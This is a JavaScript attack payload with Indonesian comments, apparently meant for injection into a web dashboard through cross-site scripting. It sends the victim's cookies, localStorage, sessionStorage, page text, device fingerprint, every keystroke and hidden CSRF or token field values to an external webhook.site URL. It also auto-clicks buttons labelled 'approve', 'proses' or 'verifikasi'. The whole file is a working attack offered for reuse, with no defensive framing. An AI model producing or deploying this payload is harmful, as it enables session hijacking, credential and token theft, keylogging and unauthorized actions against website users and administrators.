// 1. Webhook base (ganti dengan milikmu)
const hook = "https://webhook.site/d8a15841-73e2-4f6b-b9f1-b0039000383b";

// 2. Kirim cookie
try {
  fetch(`${hook}?cookie=${encodeURIComponent(document.cookie)}`);
} catch (e) {}

// 3. Kirim localStorage
try {
  fetch(`${hook}?local=${encodeURIComponent(JSON.stringify(localStorage))}`);
} catch (e) {}

// 4. Kirim sessionStorage
try {
  fetch(`${hook}?session=${encodeURIComponent(JSON.stringify(sessionStorage))}`);
} catch (e) {}

// 5. Kirim semua teks di halaman (dashboard)
try {
  fetch(`${hook}?inner=${encodeURIComponent(document.body.innerText)}`);
} catch (e) {}

// 6. Kirim fingerprint perangkat
try {
  const info = [
    navigator.userAgent,
    screen.width + "x" + screen.height,
    Intl.DateTimeFormat().resolvedOptions().timeZone,
    navigator.language
  ].join(" | ");
  fetch(`${hook}?fingerprint=${encodeURIComponent(info)}`);
} catch (e) {}

// 7. Jalankan keylogger
try {
  document.addEventListener("keydown", function(e) {
    fetch(`${hook}?key=${encodeURIComponent(e.key)}`);
  });
} catch (e) {}

// 8. Scan form: kirim isi input tersembunyi & token
try {
  const inputs = document.querySelectorAll("input[type=hidden], input[name*=token], input[name*=csrf]");
  inputs.forEach(i => {
    fetch(`${hook}?tokenname=${i.name}&tokenvalue=${i.value}`);
  });
} catch (e) {}

// 9. Auto-click tombol penting (contoh: Approve, Proses)
try {
  const btn = [...document.querySelectorAll("button, a")].find(b =>
    /approve|proses|verifikasi|ok/i.test(b.innerText)
  );
  if (btn) btn.click();
} catch (e) {}
